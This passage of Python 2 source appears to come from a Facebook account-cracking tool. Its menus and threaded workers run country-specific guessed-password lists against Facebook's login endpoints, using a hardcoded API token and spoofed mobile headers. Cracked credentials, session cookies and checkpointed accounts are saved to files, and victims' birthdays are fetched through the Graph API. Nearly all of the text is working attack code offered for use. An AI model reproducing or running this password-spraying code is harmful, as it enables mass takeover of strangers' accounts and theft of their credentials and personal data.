        print '\xe2\x94\x9c [Go] Go Back To Cracking Menu                  \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        zk = raw_input('\n \x1b[0;97m [\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Choose Your Country: ')
        if zk == '':
            print '  [!] Choose An Option'
            time.sleep(2)
            cff().cffmenu()
        elif zk == '1' or zk == '01':
            self.pakpass()
        elif zk == '2' or zk == '02':
            self.indopass()
        elif zk == '3' or zk == '03':
            self.indpass()
        elif zk == '4' or zk == '04':
            self.banglapass()
        elif zk == '5' or zk == '05':
            self.usapass()
        elif zk == 'Go' or zk == 'go':
            cracking_menu()
        else:
            print '  [!] Wrong Input! Try Again'
            time.sleep(2)
            cracking_menu()

    def pakpass(self):
        os.system('clear')
        print crackinglogo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c              \xe2\x94\x9c Cracking Started \xe2\x94\xa4\t         \xe2\x94\xa4'
        print '\xe2\x94\x9c              \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98              \xe2\x94\xa4'
        print '\xe2\x94\x9c         *** Important Instructions ***         \xe2\x94\xa4'
        print '\xe2\x94\x9c * Use Flight Mode(5 sec) If Stuck Or 0 Idz  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Stop The Cracking Process Press CTRL+Z  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Pause The Process Turn Off Internet/Wifi*  \xe2\x94\xa4'
        print '\xe2\x94\x9c *Cracked Idz Will Be Saved In Cracked Folder*  \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c  *** Wait! Cracked IDz Will Be Shown Here ***  \xe2\x94\xa4\n'
        with zthreads(max_workers=30) as (form):
            for uname in self.id:
                try:
                    uid, name = uname.split('<=>')
                    xz = name.split(' ')
                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                        pws = [
                         xz[0] + '123', xz[0] + '1234', xz[0] + '12345']
                    else:
                        pws = [
                         name, '000786', '786786', 'pakistan', xz[0] + '786']
                    form.submit(self.apiz, uid, pws)
                except:
                    pass

        cracked()
        results(ok, cp)

    def indopass(self):
        os.system('clear')
        print crackinglogo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c              \xe2\x94\x9c Cracking Started \xe2\x94\xa4\t         \xe2\x94\xa4'
        print '\xe2\x94\x9c              \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98              \xe2\x94\xa4'
        print '\xe2\x94\x9c         *** Important Instructions ***         \xe2\x94\xa4'
        print '\xe2\x94\x9c * Use Flight Mode(5 sec) If Stuck Or 0 Idz  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Stop The Cracking Process Press CTRL+Z  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Pause The Process Turn Off Internet/Wifi*  \xe2\x94\xa4'
        print '\xe2\x94\x9c *Cracked Idz Will Be Saved In Cracked Folder*  \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c  *** Wait! Cracked IDz Will Be Shown Here ***  \xe2\x94\xa4\n'
        with zthreads(max_workers=30) as (form):
            for uname in self.id:
                try:
                    uid, name = uname.split('<=>')
                    xz = name.split(' ')
                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                        pws = [
                         xz[0] + '1234', xz[0] + '12345']
                    else:
                        pws = [
                         name, 'sayang', 'anjing', 'bismillah', xz[0] + '123']
                    form.submit(self.apiz, uid, pws)
                except:
                    pass

        cracked()
        results(ok, cp)

    def indpass(self):
        os.system('clear')
        print crackinglogo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c              \xe2\x94\x9c Cracking Started \xe2\x94\xa4\t         \xe2\x94\xa4'
        print '\xe2\x94\x9c              \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98              \xe2\x94\xa4'
        print '\xe2\x94\x9c         *** Important Instructions ***         \xe2\x94\xa4'
        print '\xe2\x94\x9c * Use Flight Mode(5 sec) If Stuck Or 0 Idz  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Stop The Cracking Process Press CTRL+Z  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Pause The Process Turn Off Internet/Wifi*  \xe2\x94\xa4'
        print '\xe2\x94\x9c *Cracked Idz Will Be Saved In Cracked Folder*  \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c  *** Wait! Cracked IDz Will Be Shown Here ***  \xe2\x94\xa4\n'
        with zthreads(max_workers=30) as (form):
            for uname in self.id:
                try:
                    uid, name = uname.split('<=>')
                    xz = name.split(' ')
                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                        pws = [
                         '112233', '223344', '556677']
                    else:
                        pws = [
                         name, '000786', '786786', xz[0] + '123', xz[0] + '12345']
                    form.submit(self.apiz, uid, pws)
                except:
                    pass

        cracked()
        results(ok, cp)

    def banglapass(self):
        os.system('clear')
        print crackinglogo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c              \xe2\x94\x9c Cracking Started \xe2\x94\xa4\t         \xe2\x94\xa4'
        print '\xe2\x94\x9c              \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98              \xe2\x94\xa4'
        print '\xe2\x94\x9c         *** Important Instructions ***         \xe2\x94\xa4'
        print '\xe2\x94\x9c * Use Flight Mode(5 sec) If Stuck Or 0 Idz  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Stop The Cracking Process Press CTRL+Z  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Pause The Process Turn Off Internet/Wifi*  \xe2\x94\xa4'
        print '\xe2\x94\x9c *Cracked Idz Will Be Saved In Cracked Folder*  \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c  *** Wait! Cracked IDz Will Be Shown Here ***  \xe2\x94\xa4\n'
        with zthreads(max_workers=30) as (form):
            for uname in self.id:
                try:
                    uid, name = uname.split('<=>')
                    xz = name.split(' ')
                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                        pws = [
                         '1234567', '12345678']
                    else:
                        pws = [
                         name, 'bangladesh', '123456', xz[0] + '123', xz[0] + '12345']
                    form.submit(self.apiz, uid, pws)
                except:
                    pass

        cracked()
        results(ok, cp)

    def usapass(self):
        os.system('clear')
        print crackinglogo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c              \xe2\x94\x9c Cracking Started \xe2\x94\xa4\t         \xe2\x94\xa4'
        print '\xe2\x94\x9c              \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98              \xe2\x94\xa4'
        print '\xe2\x94\x9c         *** Important Instructions ***         \xe2\x94\xa4'
        print '\xe2\x94\x9c * Use Flight Mode(5 sec) If Stuck Or 0 Idz  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Stop The Cracking Process Press CTRL+Z  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Pause The Process Turn Off Internet/Wifi*  \xe2\x94\xa4'
        print '\xe2\x94\x9c *Cracked Idz Will Be Saved In Cracked Folder*  \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c  *** Wait! Cracked IDz Will Be Shown Here ***  \xe2\x94\xa4\n'
        cntry = open('country.txt', 'r')
        with zthreads(max_workers=30) as (form):
            for uname in self.id:
                try:
                    uid, name = uname.split('<=>')
                    xz = name.split(' ')
                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                        pws = [
                         'passwords', '123456']
                    else:
                        pws = [
                         name, 'iloveyou', 'qwerty', xz[0] + '123', xz[0] + '12345']
                    form.submit(self.apiz, uid, pws)
                except:
                    pass

        cracked()
        results(ok, cp)


class cff():

    def __init__(self):
        self.id = []

    def cffmenu(self):
        os.system('clear')
        print crackinglogo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c               Cracking From Files              \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        print '\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] File Directory Example: Files/zk.json'
        try:
            self.apk = raw_input('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter File Name: ')
            self.id = open(self.apk).read().splitlines()
        except:
            pass

        print '\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Total Idz From The File: ' + str(len(self.id))
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c               \xe2\x94\x9c Password Menu \xe2\x94\xa4\t         \xe2\x94\xa4'
        print '\xe2\x94\x9c               \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98                \xe2\x94\xa4'
        print '\xe2\x94\x9c [01]. For Default Passwords Press (D/d)        \xe2\x94\xa4'
        print '\xe2\x94\x9c [02]. For Manual  Passwords Press (M/m)        \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        zk = raw_input(' \x1b[0;97m [\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Choose An Option: ')
        if zk in ('M', 'm', '2', '02'):
            os.system('clear')
            print cracklogo
            print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
            print '\xe2\x94\x9c             \xe2\x94\x9c Manual Password Menu \xe2\x94\xa4\t         \xe2\x94\xa4'
            print '\xe2\x94\x9c             \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98           \xe2\x94\xa4'
            print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
            print '\x1b[0;97m [\xe2\x9e\xa3] Enter Password Like: 786786,000786,102030'
            while True:
                pwx = raw_input(' \x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Manual Password: ')
                zks('\x1b[0;97m [\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Applying Passwords: \x1b[0;92m%s' % pwx)
                print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
                print '\xe2\x94\x9c              \xe2\x94\x9c Cracking Started \xe2\x94\xa4\t         \xe2\x94\xa4'
                print '\xe2\x94\x9c              \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98              \xe2\x94\xa4'
                print '\xe2\x94\x9c         *** Important Instructions ***         \xe2\x94\xa4'
                print '\xe2\x94\x9c * Use Flight Mode(5 sec) If Stuck Or 0 Idz  *  \xe2\x94\xa4'
                print '\xe2\x94\x9c *To Stop The Cracking Process Press CTRL+Z  *  \xe2\x94\xa4'
                print '\xe2\x94\x9c *To Pause The Process Turn Off Internet/Wifi*  \xe2\x94\xa4'
                print '\xe2\x94\x9c *Cracked Idz Will Be Saved In Cracked Folder*  \xe2\x94\xa4'
                print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
                print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
                print '\xe2\x94\x9c  *** Wait! Cracked IDz Will Be Shown Here ***  \xe2\x94\xa4\n'
                if pwx == '':
                    zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Password Can Not Be Empty')
                elif len(pwx) <= 5:
                    zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Password Must Be Six Digits or Characters Long')
                else:

                    def zkth(zsc=None):
                        with zthreads(max_workers=30) as (form):
                            for zuid in self.id:
                                try:
                                    userid = zuid.split('<=>')[0]
                                    form.submit(self.apiz, userid, zsc)
                                except:
                                    pass

                        results(ok, cp)

                    zkth(pwx.split(','))
                    break

        elif zk in ('D', 'd', '1', '01'):
            self.country_menu()
        else:
            print '  [!] Wrong Input! Try Again'
            time.sleep(2)
            cff().cffmenu()
        return

    def apiz(self, user, zkth):
        global loop
        ua5 = 'Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36'
        ua = random.choice(['Mozilla/5.0 (Linux; Android 10; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/337.0.0.32.118;]', 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
        ua2 = 'Mozilla/5.0 (Linux; Android 10; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/337.0.0.32.118;]'
        ua1 = random.choice(['Mozilla/5.0 (Linux; Android 10; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/337.0.0.32.118;]', 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36'])
        ua3 = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE72-1/031.023; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.3.1'
        ua4 = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
        (
         sys.stdout.write('\r[\xe2\x9e\xa5] Cracking: %s/%s \xe2\x9e\xa4 OK:%s \xe2\x9e\xa4 CP:%s ' % (loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in zkth:
            pw = pw.lower()
            try:
                os.mkdir('Cracked')
            except:
                pass

            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r%s[OK]: %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s                 %s' % (H, user, pw, N)
                wrt = '%s | %s ' % (user, pw)
                ok.append(wrt)
                open('Cracked/okz.txt', 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    loginz = open('login.txt').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, loginz))
                    az = json.loads(ak.text)
                    dob = az['birthday'].replace('/', '-')
                    print '\r%s[CP]: %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s      %s' % (K, user, pw, dob, N)
                    wrt = '%s | %s | %s' % (user, pw, dob)
                    cp.append(wrt)
                    open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    dob = ''
                except:
                    pass

                print '\r%s[CP]: %s \xe2\x9e\xa4 %s                 %s' % (K, user, pw, N)
                wrt = '%s | %s ' % (user, pw)
                cp.append(wrt)
                open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def mbasicz(self, user, zkth):
        global loop
        ua = 'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977'
        ua1 = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 625) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537', 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/2.0; Touch; rv: 10.0; IEMobile/11.0; NOKIA; Lumia 635) AppleWebKit/537 KHTML, like Gecko) Mobile Safari/537', 'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586', 'Mozilla/5.0 (Linux; Android 10; Infinix X657B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.56 Mobile Safari/537.36'])
        (
         sys.stdout.write('\r[\xe2\x9e\xa5] Cracking: %s/%s \xe2\x9e\xa4 OK:%s \xe2\x9e\xa4 CP:%s ' % (loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in zkth:
            pw = pw.lower()
            try:
                os.mkdir('Cracked')
            except:
                pass

            ses = requests.Session()
            ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.facebook.com')
            b = ses.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s                 %s' % (H, user, pw, kuki, N)
                wrt = '%s | %s ' % (user, pw)
                ok.append(wrt)
                open('Cracked/okz.txt', 'a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    loginz = open('login.txt').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, loginz))
                    az = json.loads(ak.text)
                    dob = az['birthday'].replace('/', '-')
                    print '\r%s[CP]: %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s      %s' % (K, user, pw, dob, N)
                    wrt = '%s | %s | %s' % (user, pw, dob)
                    cp.append(wrt)
                    open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    dob = ''
                except:
                    pass

                print '\r%s[CP]: %s \xe2\x9e\xa4 %s                 %s' % (K, user, pw, N)
                wrt = '%s | %s ' % (user, pw)
                cp.append(wrt)
                open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def country_menu(self):
        os.system('clear')
        print zmbflogo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c                 \xe2\x94\x9c Country Menu \xe2\x94\xa4\t\t\t\t\xe2\x94\xa4'
        print '\xe2\x94\x9c                 \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98               \xe2\x94\xa4'
        print '\xe2\x94\x9c [01] Crack From Pakistan                       \xe2\x94\xa4'
        print '\xe2\x94\x9c [02] Crack From Indonesia                      \xe2\x94\xa4'
        print '\xe2\x94\x9c [03] Crack From India                          \xe2\x94\xa4'
        print '\xe2\x94\x9c [04] Crack From Bangladesh                     \xe2\x94\xa4'
        print '\xe2\x94\x9c [05] Crack From Usa                            \xe2\x94\xa4'
        print '\xe2\x94\x9c [Go] Go Back To Cracking Menu                  \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        zk = raw_input('\n \x1b[0;97m [\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Choose Your Country: ')
        if zk == '':
            print '  [!] Choose An Option'
            time.sleep(2)
            cff().cffmenu()
        elif zk == '1' or zk == '01':
            self.pakpass()
        elif zk == '2' or zk == '02':
            self.indopass()
        elif zk == '3' or zk == '03':
            self.indpass()
        elif zk == '4' or zk == '04':
            self.banglapass()
        elif zk == '5' or zk == '05':
            self.usapass()
        elif zk == 'Go' or zk == 'go':
            cracking_menu()
        else:
            print '  [!] Wrong Input! Try Again'
            time.sleep(2)
            cff().cffmenu()

    def pakpass(self):
        os.system('clear')
        print crackinglogo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c              \xe2\x94\x9c Cracking Started \xe2\x94\xa4\t         \xe2\x94\xa4'
        print '\xe2\x94\x9c              \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98              \xe2\x94\xa4'
        print '\xe2\x94\x9c         *** Important Instructions ***         \xe2\x94\xa4'
        print '\xe2\x94\x9c * Use Flight Mode(5 sec) If Stuck Or 0 Idz  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Stop The Cracking Process Press CTRL+Z  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Pause The Process Turn Off Internet/Wifi*  \xe2\x94\xa4'
        print '\xe2\x94\x9c *Cracked Idz Will Be Saved In Cracked Folder*  \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c  *** Wait! Cracked IDz Will Be Shown Here ***  \xe2\x94\xa4\n'
        with zthreads(max_workers=30) as (form):
            for uname in self.id:
                try:
                    uid, name = uname.split('<=>')
                    xz = name.split(' ')
                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                        pws = [
                         xz[0] + '123', xz[0] + '1234', xz[0] + '12345']
                    else:
                        pws = [
                         name, '000786', '786786', 'pakistan', xz[0] + '786']
                    form.submit(self.apiz, uid, pws)
                except:
                    pass

        cracked()
        results(ok, cp)

    def indopass(self):
        os.system('clear')
        print crackinglogo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c              \xe2\x94\x9c Cracking Started \xe2\x94\xa4\t         \xe2\x94\xa4'
        print '\xe2\x94\x9c              \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98              \xe2\x94\xa4'
        print '\xe2\x94\x9c         *** Important Instructions ***         \xe2\x94\xa4'
        print '\xe2\x94\x9c * Use Flight Mode(5 sec) If Stuck Or 0 Idz  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Stop The Cracking Process Press CTRL+Z  *  \xe2\x94\xa4'
        print '\xe2\x94\x9c *To Pause The Process Turn Off Internet/Wifi*  \xe2\x94\xa4'
        print '\xe2\x94\x9c *Cracked Idz Will Be Saved In Cracked Folder*  \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
